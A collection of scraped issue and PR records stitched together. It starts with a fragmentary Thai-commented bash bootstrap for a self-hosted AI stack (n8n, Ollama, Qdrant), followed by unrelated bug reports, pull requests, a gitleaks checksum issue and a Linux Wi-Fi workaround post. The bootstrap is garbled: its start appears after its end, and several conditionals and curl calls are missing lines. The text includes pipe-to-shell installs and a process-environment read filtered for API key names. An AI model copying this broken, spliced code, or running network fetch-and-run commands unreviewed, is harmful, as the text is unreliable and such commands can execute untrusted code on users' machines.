echo "── env ที่ n8n เห็น ──"
PID=$(pgrep -f 'n8n start' | head -1 || true)
if [ -n "$PID" ]; then
  tr '\0' '\n' < /proc/$PID/environ | grep -E 'GEMINI|GROQ|OLLAMA|QDRANT' | sed 's/=.*/=***/'
fi
S
chmod +x $BASE/02-install/03-n8n-env.sh

#!/usr/bin/env bash

echo "══════ Provider health ══════"

if [ -n "${GEMINI_API_KEY:-}" ]; then
  code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 \
    "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=$GEMINI_API_KEY" \
    -H 'Content-Type: application/json' \
    -d '{"contents":[{"parts":[{"text":"ok"}]}]}')

else echo "gemini : no key"; fi

if [ -n "${GROQ_API_KEY:-}" ]; then
  code=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 \
    https://api.groq.com/openai/v1/chat/completions \

if command -v ollama >/dev/null; then

    http://127.0.0.1:11434/api/chat \
    -d '{"model":"llama3.2:3b","messages":[{"role":"user","content":"ok"}],"stream":false}')
  printf "ollama : %s\n" "$code"
else echo "ollama : not installed"; fi

if curl -sS -o /dev/null --max-time 5 http://127.0.0.1:6333/collections; then

else echo "qdrant : DOWN"; fi

if curl -sS -o /dev/null -w '%{http_code}\n' http://127.0.0.1:5678/healthz | grep -q 200; then

else echo "n8n    : DOWN"; fi

cat > $BASE/04-rag/index-evidence.sh <<'S'
#!/usr/bin/env bash
# Index CK-NEXUS evidence → Qdrant
set -euo pipefail
source /root/.ai-providers.env
QDRANT=${QDRANT_URL:-http://127.0.0.1:6333}
SRC=${1:-/root/cknexus-q10-q16-closure-evidence-20261011T155513Z}

echo "▶ Index จาก $SRC"
[ -d "$SRC" ] || { echo "✗ ไม่พบ $SRC"; exit 1; }

ID=1
find "$SRC" -type f \( -name '*.md' -o -name '*.txt' -o -name '*.json' \) | while read -r f; do
  CONTENT=$(head -c 4000 "$f" | tr '\n' ' ' | sed 's/"/\\"/g')
  [ -z "$CONTENT" ] && continue

  # embed ผ่าน Ollama
  VEC=$(curl -sS "${OLLAMA_BASE_URL}/api/embeddings" \
    -d "{\"model\":\"${EMBED_MODEL}\",\"prompt\":\"$CONTENT\"}" | jq -c '.embedding')

  [ "$VEC" = "null" ] && continue

  curl -sS -X PUT "$QDRANT/collections/cknexus/points" \
    -H 'Content-Type: application/json' \
    -d "{\"points\":[{\"id\":$ID,\"vector\":$VEC,\"payload\":{\"path\":\"$f\",\"preview\":\"${CONTENT:0:200}\"}}]}" \
    >/dev/null

  echo "  ✓ $f"
  ID=$((ID+1))
done
echo "✓ Indexed. ตรวจ: curl $QDRANT/collections/cknexus"
S
chmod +x $BASE/04-rag/index-evidence.sh

set -euo pipefail
source /root/.ai-providers.env
QDRANT=${QDRANT_URL:-http://127.0.0.1:6333}
Q="${1:-Q10 ปิดอะไร}"

VEC=$(curl -sS "${OLLAMA_BASE_URL}/api/embeddings" \
  -d "{\"model\":\"${EMBED_MODEL}\",\"prompt\":\"$Q\"}" | jq -c '.embedding')

curl -sS -X POST "$QDRANT/collections/cknexus/points/search" \
  -H 'Content-Type: application/json' \
  -d "{\"vector\":$VEC,\"limit\":5,\"with_payload\":true}" | jq '.result[] | {score,path:.payload.path}'
S
chmod +x $BASE/04-rag/query.sh

# ─────────────────────────────────────────────────────────────
# 05-clients/cli-chat.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/05-clients/cli-chat.sh <<'S'
#!/usr/bin/env bash
MSG="${1:-say OK}"
curl -sS -X POST http://127.0.0.1:5678/webhook/free-ai \
  -H 'Content-Type: application/json' \
  -d "{\"message\":\"$MSG\",\"sessionId\":\"cli\"}" | jq .
S
chmod +x $BASE/05-clients/cli-chat.sh

cat > $BASE/05-clients/continue-config.json <<'JSON'
{
  "models": [{
    "title": "Ollama Llama 3.2",
    "provider": "ollama",
    "model": "llama3.2:3b",
    "apiBase": "http://127.0.0.1:11434"
  }],
  "tabAutocompleteModel": {
    "title": "Qwen Coder",
    "provider": "ollama",
    "model": "qwen2.5-coder:1.5b"
  },
  "embeddingsProvider": {
    "provider": "ollama",
    "model": "nomic-embed-text"
  }
}
JSON

# ─────────────────────────────────────────────────────────────
# 06-ops/health.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/06-ops/health.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
source /root/.ai-providers.env 2>/dev/null || true
echo "══════ CK-NEXUS AI Stack — Health ══════"
echo "Time: $(date -u)"
echo
echo "── systemd ──"
for s in n8n ollama docker; do
  printf "%-10s : %s\n" "$s" "$(systemctl is-active $s 2>/dev/null || echo n/a)"
done
echo
echo "── docker ──"
docker ps --format 'table {{.Names}}\t{{.Status}}' 2>/dev/null | grep -E 'qdrant|trypost' || echo "(none)"
echo
echo "── endpoints ──"
printf "n8n healthz   : %s\n" "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:5678/healthz)"
printf "ollama        : %s\n" "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:11434/api/tags)"
printf "qdrant        : %s\n" "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:6333/collections)"
echo
echo "── providers ──"
$BASE/02-install/99-verify.sh 2>/dev/null || true
echo
echo "── disk ──"
df -h /root | tail -1
echo
echo "── RAM ──"
free -h | grep -E 'Mem|Swap'
S
chmod +x $BASE/06-ops/health.sh

# ─────────────────────────────────────────────────────────────
# 06-ops/backup.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/06-ops/backup.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
TS=$(date -u +%Y%m%dT%H%M%SZ)
OUT=/root/cknexus-ai-backup-${TS}
mkdir -p "$OUT"

# copy config (ไม่รวม keys จริง)
cp -a /root/cknexus-ai-stack          "$OUT/" 2>/dev/null || true
cp -a /root/.n8n                      "$OUT/.n8n" 2>/dev/null || true
cp -a /etc/systemd/system/n8n.service.d "$OUT/n8n.service.d" 2>/dev/null || true
docker exec qdrant tar -czf - /qdrant/storage > "$OUT/qdrant-storage.tar.gz" 2>/dev/null || true

# report
{
  echo "Backup: $TS"
  echo "Host:   $(hostname)"
  echo "Kernel: $(uname -r)"
  echo "Files:"
  find "$OUT" -type f | head -50
} > "$OUT/MANIFEST.txt"

tar czf "${OUT}.tar.gz" -C /root "$(basename "$OUT")"
sha256sum "${OUT}.tar.gz" > "${OUT}.tar.gz.sha256"
rm -rf "$OUT"
echo "✓ Backup: ${OUT}.tar.gz"
S
chmod +x $BASE/06-ops/backup.sh

# ─────────────────────────────────────────────────────────────
# 06-ops/logs.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/06-ops/logs.sh <<'S'
#!/usr/bin/env bash
echo "══════ n8n (last 30) ══════"
journalctl -u n8n -n 30 --no-pager 2>/dev/null | tail -30
echo
echo "══════ ollama (last 20) ══════"
journalctl -u ollama -n 20 --no-pager 2>/dev/null | tail -20
echo
echo "══════ qdrant (last 20) ══════"
docker logs --tail 20 qdrant 2>&1 | tail -20
S
chmod +x $BASE/06-ops/logs.sh

# ─────────────────────────────────────────────────────────────
# install.sh (MASTER)
# ─────────────────────────────────────────────────────────────
cat > $BASE/install.sh <<'S'
#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════
#  CK-NEXUS AI Stack — Master Installer
# ══════════════════════════════════════════════════════════════
set -euo pipefail
cd "$(dirname "$0")"
LOG=/root/cknexus-ai-stack-install-$(date -u +%Y%m%dT%H%M%SZ).log
exec > >(tee -a "$LOG") 2>&1

C_G="\033[1;32m"; C_B="\033[1;34m"; C_Y="\033[1;33m"; C_N="\033[0m"
say(){ echo -e "${C_B}▶${C_N} $*"; }
ok(){  echo -e "${C_G}✓${C_N} $*"; }
warn(){ echo -e "${C_Y}⚠${C_N} $*"; }

echo "════════════════════════════════════════════════════════════"
echo "  CK-NEXUS AI Stack — Installer"
echo "  $(hostname) @ $(date -u)"
echo "════════════════════════════════════════════════════════════"
echo

say "[1/6] ตรวจสภาพแวดล้อม"
./00-prereq/check.sh | tee /tmp/prereq.out
echo

say "[2/6] ตั้งค่า API keys"
if [ -f /root/.ai-providers.env ] && [ -s /root/.ai-providers.env ]; then
  ok "/root/.ai-providers.env มีอยู่แล้ว — ข้าม"
  echo "  (รัน ./01-env/setup-env.sh ถ้าต้องการเปลี่ยน)"
else
  ./01-env/setup-env.sh
fi
echo

say "[3/6] ติดตั้ง Ollama"
./02-install/01-ollama.sh || warn "Ollama ติดตั้งไม่สมบูรณ์"
echo

say "[4/6] ติดตั้ง Qdrant"
./02-install/02-qdrant.sh || warn "Qdrant ติดตั้งไม่สมบูรณ์"
echo

say "[5/6] ผูก env เข้า n8n"
./02-install/03-n8n-env.sh
echo

say "[6/6] Verify"
./02-install/99-verify.sh
echo

echo "════════════════════════════════════════════════════════════"
ok "ติดตั้งเสร็จ"
echo "════════════════════════════════════════════════════════════"
echo
echo "  Log: $LOG"
echo
echo "  ขั้นถัดไป:"
echo "    1) Import workflows เข้า n8n:"
echo "       $BASE/03-workflows/*.json"
echo "    2) ตั้ง Qdrant collection:"
echo "       $BASE/04-rag/qdrant-init.sh"
echo "    3) ทดสอบ:"
echo "       $BASE/05-clients/cli-chat.sh 'say OK'"
echo "    4) Health:"
echo "       $BASE/06-ops/health.sh"
echo
S
chmod +x $BASE/install.sh

# ─────────────────────────────────────────────────────────────
# uninstall.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/uninstall.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
echo "⚠  ลบ CK-NEXUS AI Stack"
echo "  (ไม่ลบ n8n หรือข้อมูลเดิม)"
read -rp "ยืนยัน? [y/N] " a
[[ "$a" == "y" ]] || exit 0

docker stop qdrant 2>/dev/null && docker rm qdrant 2>/dev/null || true
systemctl stop ollama 2>/dev/null || true
rm -f /etc/systemd/system/n8n.service.d/30-ai-providers.conf
systemctl daemon-reload
echo "✓ ลบแล้ว (config ที่ /root/cknexus-ai-stack ยังอยู่)"
S
chmod +x $BASE/uninstall.sh

# ─────────────────────────────────────────────────────────────
# MANIFEST
# ─────────────────────────────────────────────────────────────
cat > $BASE/MANIFEST.json <<'JSON'
{
  "name": "cknexus-ai-stack",
  "version": "1.0.0",
  "created": "2026-10-12",
  "components": {
    "services": ["n8n", "ollama", "qdrant"],
    "providers": ["gemini", "groq", "ollama"],
    "workflows": ["free-ai-assistant", "ticket-triage"],
    "rag": ["qdrant", "nomic-embed-text"],
    "clients": ["cli-chat", "continue.dev"]
  },
  "ports": {
    "n8n": 5678,
    "ollama": 11434,
    "qdrant": 6333
  }
}
JSON

# ─────────────────────────────────────────────────────────────
# จบ
# ─────────────────────────────────────────────────────────────
chmod -R u+rwX $BASE
echo
echo "════════════════════════════════════════════════════════════"
ok "สร้างโครงสร้างเสร็จ: $BASE"
echo "════════════════════════════════════════════════════════════"
echo
find $BASE -type f | sort | sed "s|$BASE/||"
echo
echo "รัน installer ด้วย:"
echo "  $BASE/install.sh"
echo
BOOTSTRAP

chmod +x /root/bootstrap-cknexus-ai.sh
/root/bootstrap-cknexus-ai.sh
```

items.body:
📦 CK-NEXUS AI Stack — Consolidated & Organized

โครงสร้างเดียวจบ — ทุกอย่างที่คุยกันมาจัดเป็นระเบียบ พร้อม deploy

---

🗂️ โครงสร้างโฟลเดอร์

```
/root/cknexus-ai-stack/
├── README.md                    ← คู่มือหลัก
├── MANIFEST.json                ← metadata + checksums
├── 00-prereq/
│   └── check.sh                 ← ตรวจ RAM/disk/docker
├── 01-env/
│   ├── .env.template            ← template (safe commit)
│   └── setup-env.sh             ← interactive prompt
├── 02-install/
│   ├── 01-ollama.sh             ← local LLM
│   ├── 02-qdrant.sh             ← vector DB
│   ├── 03-n8n-env.sh            ← n8n integration
│   └── 99-verify.sh             ← health check
├── 03-workflows/
│   ├── free-ai-assistant.json   ← Smart Router
│   ├── multi-agent.json         ← Multi-agent orchestration
│   └── ticket-triage.json       ← Ticket classification
├── 04-rag/
│   ├── qdrant-init.sh           ← สร้าง collection
│   ├── index-evidence.sh        ← index CK-NEXUS evidence
│   └── query.sh                 ← ทดสอบ search
├── 05-clients/
│   ├── continue-config.json     ← VS Code AI
│   └── cli-chat.sh              ← CLI chat
├── 06-ops/
│   ├── health.sh                ← ตรวจทุก service
│   ├── backup.sh                ← backup stack
│   └── logs.sh                  ← ดู log รวม
├── install.sh                   ← MASTER installer
└── uninstall.sh                 ← rollback
```

---

🚀 ชุดเดียวจบ — สร้างทั้งหมด

Copy บล็อกนี้ทั้งหมด วางใน terminal — จะสร้างโครงสร้าง + ไฟล์ + รัน installer

```bash
cat > /root/bootstrap-cknexus-ai.sh <<'BOOTSTRAP'
#!/usr/bin/env bash
# ══════════════════════════════════════════════════════════════
#  CK-NEXUS AI Stack — Bootstrap
#  สร้างโครงสร้าง + ไฟล์ทั้งหมด + รัน installer
# ══════════════════════════════════════════════════════════════
set -euo pipefail

BASE=/root/cknexus-ai-stack
say(){ echo -e "\033[1;34m▶\033[0m $*"; }
ok(){  echo -e "\033[1;32m✓\033[0m $*"; }

say "สร้างโครงสร้างที่ $BASE"
mkdir -p $BASE/{00-prereq,01-env,02-install,03-workflows,04-rag,05-clients,06-ops}

# ─────────────────────────────────────────────────────────────
# README.md
# ─────────────────────────────────────────────────────────────
cat > $BASE/README.md <<'README'
# CK-NEXUS AI Stack

ระบบผู้ช่วย AI ฟรี 100% — self-hosted บน VPS
ใช้ n8n + Ollama + Gemini + Groq + Qdrant

## Quick Start

    cd /root/cknexus-ai-stack
    ./install.sh

## โครงสร้าง

- 00-prereq/   ตรวจสภาพแวดล้อม
- 01-env/      จัดการ API keys
- 02-install/  ติดตั้ง services
- 03-workflows/ n8n workflows (import เข้า n8n)
- 04-rag/      Qdrant + embeddings
- 05-clients/  CLI tools + IDE config
- 06-ops/      health, backup, logs

## Services

| Service  | Port        | คำสั่ง |
|----------|-------------|--------|
| n8n      | 5678        | systemctl status n8n |
| Ollama   | 11434       | systemctl status ollama |
| Qdrant   | 6333        | docker logs qdrant |

## คำสั่งบ่อย

    ./06-ops/health.sh           # ตรวจทุก service
    ./05-clients/cli-chat.sh "สวัสดี"  # chat ผ่าน webhook
    ./06-ops/backup.sh           # backup stack
    ./06-ops/logs.sh             # ดู log รวม

## Provider fallback

gemini → groq → ollama (อัตโนมัติ)

## ลิงก์

- n8n:    http://127.0.0.1:5678  (SSH tunnel)
- Qdrant: http://127.0.0.1:6333/dashboard
README

# ─────────────────────────────────────────────────────────────
# 00-prereq/check.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/00-prereq/check.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
echo "══════ สภาพแวดล้อม ══════"
echo "Host:  $(hostname)"
echo "User:  $(whoami)"
echo "Kernel: $(uname -r)"
echo
echo "── CPU ──"
nproc
echo
echo "── RAM ──"
free -h
RAM_MB=$(free -m | awk '/^Mem:/{print $2}')
SWAP_MB=$(free -m | awk '/^Swap:/{print $2}')
echo "RAM: ${RAM_MB}MB  Swap: ${SWAP_MB}MB"
if [ "$RAM_MB" -lt 3500 ]; then
  echo "⚠  RAM < 3.5GB → ข้าม Ollama"
fi
echo
echo "── Disk ──"
df -h /root
echo
echo "── Docker ──"
docker --version 2>/dev/null || echo "✗ ไม่มี Docker"
docker ps --format 'table {{.Names}}\t{{.Status}}' 2>/dev/null || true
echo
echo "── Services ──"
for svc in n8n ollama docker postgresql redis-server; do
  printf "%-15s : %s\n" "$svc" "$(systemctl is-active $svc 2>/dev/null || echo n/a)"
done
echo
echo "── Tools ──"
for t in node npm python3 curl jq git; do
  printf "%-10s : %s\n" "$t" "$(command -v $t >/dev/null && $t --version 2>&1 | head -1 || echo 'missing')"
done
S
chmod +x $BASE/00-prereq/check.sh

# ─────────────────────────────────────────────────────────────
# 01-env/setup-env.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/01-env/setup-env.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
ENV_FILE=/root/.ai-providers.env

echo "══════ ตั้งค่า AI Providers ══════"
echo "Gemini:     https://aistudio.google.com/app/apikey"
echo "Groq:       https://console.groq.com/keys"
echo "OpenRouter: https://openrouter.ai/keys  (optional)"
echo

read -rsp "GEMINI_API_KEY (Enter=skip): "     GEMINI_API_KEY;     echo
read -rsp "GROQ_API_KEY (Enter=skip): "       GROQ_API_KEY;       echo
read -rsp "OPENROUTER_API_KEY (Enter=skip): " OPENROUTER_API_KEY; echo

GEMINI_API_KEY=${GEMINI_API_KEY//[[:space:]]/}
GROQ_API_KEY=${GROQ_API_KEY//[[:space:]]/}
OPENROUTER_API_KEY=${OPENROUTER_API_KEY//[[:space:]]/}

install -m 600 /dev/null "$ENV_FILE"
{
  echo "# AI Providers — $(date -u)"
  [[ -n $GEMINI_API_KEY     ]] && echo "GEMINI_API_KEY=$GEMINI_API_KEY"
  [[ -n $GROQ_API_KEY       ]] && echo "GROQ_API_KEY=$GROQ_API_KEY"
  [[ -n $OPENROUTER_API_KEY ]] && echo "OPENROUTER_API_KEY=$OPENROUTER_API_KEY"
  echo "OLLAMA_BASE_URL=http://127.0.0.1:11434"
  echo "OLLAMA_MODEL=llama3.2:3b"
  echo "EMBED_MODEL=nomic-embed-text"
  echo "QDRANT_URL=http://127.0.0.1:6333"
  echo "AI_PRIMARY=gemini"
  echo "AI_FALLBACK_1=groq"
  echo "AI_FALLBACK_2=ollama"
} > "$ENV_FILE"
chmod 600 "$ENV_FILE"

echo "✓ บันทึก $ENV_FILE ($(stat -c '%A %s' $ENV_FILE))"
S
chmod +x $BASE/01-env/setup-env.sh

cat > $BASE/01-env/.env.template <<'T'
# AI Providers — อย่า commit ค่าจริง
GEMINI_API_KEY=
GROQ_API_KEY=
OPENROUTER_API_KEY=
OLLAMA_BASE_URL=http://127.0.0.1:11434
OLLAMA_MODEL=llama3.2:3b
EMBED_MODEL=nomic-embed-text
QDRANT_URL=http://127.0.0.1:6333
T

# ─────────────────────────────────────────────────────────────
# 02-install/01-ollama.sh
# ─────────────────────────────────────────────────────────────
cat > $BASE/02-install/01-ollama.sh <<'S'
#!/usr/bin/env bash
set -euo pipefail
RAM_MB=$(free -m | awk '/^Mem:/{print $2}')
if [ "$RAM_MB" -lt 3500 ]; then
  echo "⚠  RAM ${RAM_MB}MB < 3.5GB — ข้าม Ollama"
  exit 0
fi
if command -v ollama >/dev/null 2>&1; then
  echo "✓ Ollama มีอยู่แล้ว: $(ollama --version 2>&1 | head -1)"
else
  echo "▶ ติดตั้ง Ollama..."
  curl -fsSL https://ollama.com/install.sh | sh
fi
systemctl enable --now ollama
sleep 3
systemctl is-active ollama && echo "✓ ollama active"

items.title: windows kftui installer reports success after a failed download

labels.name: kind:bug
labels.description: Wrong behavior a user can hit

labels.name: area:ci
labels.description: CI workflows, crates/kftray-e2e, hacks/, .mise.toml and README.md

items.body:
When the download fails, `kftui_installer.ps1` prints `kftui installed successfully` and exits 0. With an older `kftui.exe` in `~\.local\bin`, the script then runs it and prints its version. The old build looks like the new one. Any Windows user whose download fails hits it: a GitHub outage, a proxy or the 60 per hour limit on the unauthenticated releases API.

## Reproduce

This machine had no `pwsh`, so I unpacked PowerShell 7.4.6 into `/tmp`:

```bash
curl -sSfL -o /tmp/pwsh.tgz https://github.com/PowerShell/PowerShell/releases/download/v7.4.6/powershell-7.4.6-linux-x64.tar.gz
mkdir -p /tmp/pwsh && tar xzf /tmp/pwsh.tgz -C /tmp/pwsh && chmod +x /tmp/pwsh/pwsh
```

Case 1 has an old `kftui.exe` in place and a tag with no release, so the real `Invoke-WebRequest` gets a 404 from GitHub:

```bash
probe=$(mktemp -d) && mkdir -p "$probe/home/.local/bin" "$probe/work"
printf '#!/bin/sh\necho kftui 0.32.5\n' > "$probe/home/.local/bin/kftui.exe" && chmod +x "$probe/home/.local/bin/kftui.exe"
cd "$probe/work" && HOME="$probe/home" KFTUI_INSTALLER=<repo>/hacks/kftui_installer.ps1 /tmp/pwsh/pwsh -NoProfile -NonInteractive -Command '
function Invoke-RestMethod { [pscustomobject]@{ tag_name = "v0.0.0-missing" } }
Invoke-Expression (Get-Content -Raw -LiteralPath $env:KFTUI_INSTALLER)'; echo "exit=$?"
```

```text
Downloading kftui from https://github.com/hcavarsan/kftray/releases/download/v0.0.0-missing/kftui_windows_x86_64.exe
Invoke-WebRequest: ... Page not found · GitHub ...
Installing kftui to .../home\.local\bin
Move-Item: Cannot find path '.../work/kftui.exe' because it does not exist.
kftui installed successfully
Added .../home\.local\bin to your user PATH. Restart your terminal to use kftui.
kftui 0.32.5
exit=0
```

Case 2 starts with an empty `HOME`. Its `Invoke-RestMethod` wrapper calls the real cmdlet on a repo that doesn't exist, so the API call fails the way a rate limit does. The script still downloads `.../releases/download//kftui_windows_x86_64.exe`, prints `kftui installed successfully`, fails to run `kftui.exe --version` and exits 0.

## Where

- `hacks/kftui_installer.ps1` never sets `$ErrorActionPreference`, so the default `Continue` applies. A failed cmdlet only ends its own statement, and the script goes on.
- `:55` keeps going with an empty `$LATEST_RELEASE` when the API call fails, and `:56` builds a URL with an empty tag.
- `:26` fails on the 404, and `:37` fails because no file exists. `:38` then prints success, and `:51` runs the `kftui.exe` that was there before.
- `hacks/tests/test_kftui_installer_ps1.py:12` sets `$ErrorActionPreference = 'Stop'` in its stubs, so the only test runs with a setting the real script doesn't have.

## Fix

Set `$ErrorActionPreference = 'Stop'` at the top of `kftui_installer.ps1`, so a failed API call or download stops the script before `Move-Item` and the old `kftui.exe` stays. A test in `hacks/tests/test_kftui_installer_ps1.py` without the `Stop` line in its stubs, with an `Invoke-WebRequest` stub that calls `Write-Error`, would prove it. It checks for a non-zero exit, no success line and an unchanged `kftui.exe`. Small, one script plus the test.

items.title: Terminal: file permissions with chmod, x bit to run scripts, prompt gap
items.body:
## What

Three terminal problems from a playtest, plus the holes a review of the first fix found.

1. **The typed line lost the space after the prompt.** `Prompt` renders `" ❯ "`, but on the input line the prompt span is a flex item of `.t-input`, where `white-space: nowrap` drops the trailing space: `❯ls` while submitted rows showed `❯ ls`. `.t-input .prompt { white-space: pre }` keeps it and still never wraps.

2. **No file permissions.** `ls -l` faked `-rw-r--r--`, and `scriptAt()` ran any `.msh`/`.sh`/shebang file named as a command whatever its mode, so `./test.msh` ran from a 644 file. New `src/terminal/modes.ts` is the one place that says what a path's mode is and what it allows; `ls -l`, `find` (`-perm`, `-executable`, `-readable`, `-writable`, `%m`, `%M`, `%u`, `-user`), Tab completion, running a file and the shell's readers all ask it. Defaults keep today's behaviour (site files list 444 yet `cat` works, browser files are writable, `/bin` is 555, `/tmp` 1777, `.game` files run).

3. **`chmod`** ([`src/terminal/chmod.ts`](src/terminal/chmod.ts)): octal and symbolic modes, `-R`, `-v`, `-c`, `-f`, a man page, a `help` entry, Tab. Modes are kept where the storage can keep them: `/tmp` on the node, browser files in their IndexedDB record, Seafile in a per-account table in this browser (the API has no modes). `mv` keeps a mode, `cp` copies it, a replaced file takes the new file's mode, creating starts at the default. Special bits are shown as `s`/`S`/`t`/`T` and cleared by `=`, as in chmod; setuid grants nothing here.

A script now needs its x bit to run: `./test.msh` without one prints `msh: ./test.msh: Permission denied` and exits 126, while `source`, `.` and `msh file` read it without, like a real shell. `./te<Tab>` offers folders, `.game` files and files with an x bit (the picker calls them `executable`), and no longer offers plain files that cannot run. Reads and writes are refused only where `chmod` set the mode; `sudo` ignores all of it.

The review round also closed: `readFileText` bypassing a refused read (nano, agents' `@path`), writes through `writeTmp` (`find -fprint`, `curl -o`, `wget`, `tee`) and `cp`/`mv` over a protected destination, root being dropped in `find -delete` and folder copies, stale executable bits surviving a replacing move, and three separate owner calculations. It also turned up that `rm /tmp/a/b` removed nothing (it always deleted from `/tmp` itself).

Not fixed here: `cp a b` inside one Seafile folder copies `a` as `a (1)` and renames the original `a` to `b` (`src/terminal/fs.ts`, same-folder branch). Pre-existing, confirmed on `7d67874`; separate PR.

README (Terminal, Permissions) and the msh reference are updated.

## Tests

- `pnpm typecheck`, `pnpm check:terminal-cmds` (355 checks, Seafile's API faked in memory so the real `transfer`/`writeFile`/`touchFile` paths run), `pnpm check:msh-rc`, `pnpm check:terminal-vt`, `pnpm build`: pass.
- Browser (desktop 1280 and phone 390): prompt gap equal to a submitted row, `./demo.msh` refused then running after `chmod +x`, `./demo<Tab>` offering nothing before and completing after, `nano` refusing a `chmod a-r` file with `nano: hidden.txt: Permission denied`, `ls -l` and `find -printf '%m %M'` agreeing.

items.title: refactor: extract shared shell helpers and a buildx/ghcr composite action
items.body:
## Summary

Four patterns were repeated across the build scripts, the Dockerfile and the release workflow; each now has a single definition.

**`scripts/lib/common.sh`** (sourced by all bash install scripts, `. "${BASH_SOURCE[0]%/*}/lib/common.sh"`):
- `require_env VAR...` — replaces the per-variable `: "${VAR:?...}"` chains.
- `apt_install pkg...` — `apt-get update` + `install -yq --no-install-recommends` + cache purge, which existed in three places (`install-system-pkgs.sh` and two Dockerfile `RUN`s) with two different cleanup spellings (`rm -rf /var/cache/apt/archives` vs `.../archives/*`).
- `fetch_bin url dest` — `curl -fsSL … -o dest && chmod +x`.
- `unlink_hardlinks root file` — the `find -samefile … -delete; rm -f` pair that `prune_inodes` and the claude-agent-sdk symlink loop each had their own copy of.

**`scripts/apt-install.sh`** is the Dockerfile-facing entrypoint for `apt_install`, so the two inline `RUN apt-get update && apt-get install …` blocks become `RUN /tmp/scripts/apt-install.sh ca-certificates curl binutils` / `RUN /tmp/scripts/apt-install.sh pipx`. `scripts/lib` is its own `COPY` layer in both stages so the per-script layers stay independently cacheable, and the clitools stage now stages scripts under `/tmp/scripts/` like stage 3 already did.

**`.github/actions/buildx-ghcr`** composite action replaces the identical setup-buildx + ghcr login step pairs in the `build` and `merge` jobs (`username` defaults to `github.actor`, `password` is an input).

Behaviour is unchanged except that the apt caches are now also purged in the throwaway `clitools` stage, and `helm` keeps its explicit `chmod +x` (it comes out of a tarball, not `fetch_bin`).

## Verification

- `shellcheck -x` and `bash -n` clean on all scripts.
- `docker buildx build --platform linux/amd64 --target clitools` succeeds; the resulting `/out/{argocd,helm,kubectl,claude}` are executable and `kubectl`/`helm`/`argocd` report the pinned versions.

items.title: fix(ci): pin gitleaks version and verify checksum in security workflow
items.body:
## Problem

The `security.yml` workflow downloads gitleaks dynamically from GitHub releases without pinning the version or verifying the checksum. The version is resolved from the "latest" tag via the GitHub API, which is non-reproducible and vulnerable to tag manipulation.

## Actual Output

```yaml
# .github/workflows/security.yml:23-26
GITLEAKS_VERSION=$(curl -sSf https://api.github.com/repos/gitleaks/gitleaks/releases/latest | grep '"tag_name"' | sed 's/.*"v\(.*\)".*/\1/')
curl -sSfL "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" | tar xz
chmod +x gitleaks
```

No SHA256 checksum or GPG signature verification.

## How to Fix

Pin gitleaks to a specific version and verify checksum:
```yaml
- name: Install gitleaks
  run: |
    GITLEAKS_VERSION=8.21.3
    curl -sSfL -o gitleaks.tar.gz "https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz"
    echo "<expected-sha256>  gitleaks.tar.gz" | sha256sum -c -
    tar xzf gitleaks.tar.gz
    chmod +x gitleaks
```

Or use `gitleaks/gitleaks-action` pinned to a commit SHA.

## Expected Output

gitleaks version is pinned and checksum verified before execution.

## Critical Level

Low -- supply chain risk in security workflow.

## My Confidence

High -- directly observed in `.github/workflows/security.yml:23-26`.

## Why Matters?

A compromised gitleaks release or tag can execute arbitrary code in the CI environment, potentially exfiltrating secrets or modifying the codebase.

items.body: ⚠️ [TUTO/temporary fix] Reboot Freeze & CPU Overheating after Linux-Firmware Update (Intel AX211 / CNVi Wi-Fi Cards) Hey everyone, If since the September 11, 2026 system update, your laptop completely freezes when trying to reboot (forcing you to hard shutdown using the Power button) or if your CPU usage spikes abnormally while gaming with fans blasting at max speed, you are not alone! 🛑 The Issue: The latest linux-firmware package update pushed by System76 introduces a critical bug in the power management (ASPM/RFIm) of Intel Wi-Fi chips (specifically the Intel AX211). The network card crashes repeatedly in the background, spamming thousands of unseen error logs (WPFM_UMAC_PD_NOTIFICATION, RFIm is deactivated). This maxes out a CPU core, causes the machine to overheat while gaming, and blocks the power shutdown protocol (ACPI) during reboots. Since downgrading is tricky on this specific release, here is the official software workaround to disable the faulty power savings mode and permanently stabilize your system without any loss in network performance. 🛠️ The Solution (in 3 simple commands): Open your terminal and run these commands one after the other: 1. Disable aggressive Intel Wi-Fi power savings: echo -e "options iwlwifi power_save=0\noptions iwlmvm power_scheme=1" | sudo tee /etc/modprobe.d/iwlwifi.conf 2. Force the system to safely unload the network module right before shutdown: echo "modprobe -r iwlwifi" | sudo tee /usr/lib/systemd/system-shutdown/kill-wifi.sh && sudo chmod +x /usr/lib/systemd/system-shutdown/kill-wifi.sh 3. Update the boot image to apply all changes permanently: sudo update-initramfs -u (Wait about 20 seconds for the process to finish). 🔄 To finalize: Perform one last hard shutdown manually (long press on the Power button) to purge the old crashes from the RAM. Turn your laptop back on: your CPU will be quiet while gaming, and standard reboots will work perfectly on the first try! (This fix is completely safe and can be kept indefinitely through future system updates). Before fix : After fix: This is the only solution I have found while waiting for a future fix; the previous driver worked perfectly, but it was removed from my Pop!_OS system cache and I have not been able to revert to an earlier version of the wifi driver. Suggested fix for the development team:Since the Wi-Fi firmware is bundled inside the massive global linux-firmware package, end-users cannot easily isolate and downgrade this specific Intel component on their own.The cleanest and most effective solution would be for System76 to revert or reintegrate the previous stable Intel driver version into the next package update to overwrite this unstable release for all affected users.

